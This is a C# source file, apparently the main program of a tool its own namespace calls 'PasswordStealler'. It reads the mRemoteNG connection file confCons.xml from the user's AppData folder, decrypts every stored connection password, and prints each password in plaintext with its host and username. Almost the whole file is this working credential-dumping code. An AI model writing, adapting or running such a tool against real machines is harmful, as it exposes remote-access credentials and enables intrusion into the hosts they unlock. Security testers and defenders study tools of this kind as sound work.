using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Generators;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Security;
using PasswordStealler.Decryprion;
using PasswordStealler.Decryption;
using PasswordStealler.Decryption;
using PasswordStealler.Factories;
using System;
using System.IO;
using System.Xml.Linq;
using PasswordStealler.ConfParser;


namespace PasswordStealler.App
{
    internal class Root
    {
        static void Main(string[] args)
        {
            string pathToXml = null;
            string masterPassword = null;

            for (int i = 0; i < args.Length; i++)
            {
                if (args[i] == "-p" && i + 1 < args.Length) 
                {
                    pathToXml = args[i + 1]; 
                    i++; 
                }
                else if (args[i] == "-master" && i + 1 < args.Length) 
                {
                    masterPassword = args[i + 1]; 
                    i++; 
                }
            }
            if(pathToXml == null)
            {
                string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                pathToXml = Path.Combine(appDataPath, "mRemoteNG", "confCons.xml");
            }
            
            //Console.WriteLine(pathToXml);
            XDocument xDocument = XDocument.Load(pathToXml);
            ICryptographyProvider cryptoProvider = new CryptoProviderFactoryFromXml(xDocument.Root).Build();

            ConfigParser parser = new ConfigParser();
            List<Connection> connections = ConfigParser.ConfigParse(pathToXml);


            int counter = 1;
            foreach (Connection con in connections)
            {
                if (!(masterPassword == null))
                {
                    con.defaultPass = masterPassword;
                }
                string password = cryptoProvider.Decrypt(con.password, con.defaultPass.ConvertToSecureString());
                Console.WriteLine($"Connection number: {counter} \n Connection name: {con.connectionName}" +
                    $" \n Connection ip: {con.hostname} \n Connection password: {password}\n Connection username: {con.username} \n");
                counter++;
            }

        }
    }
}
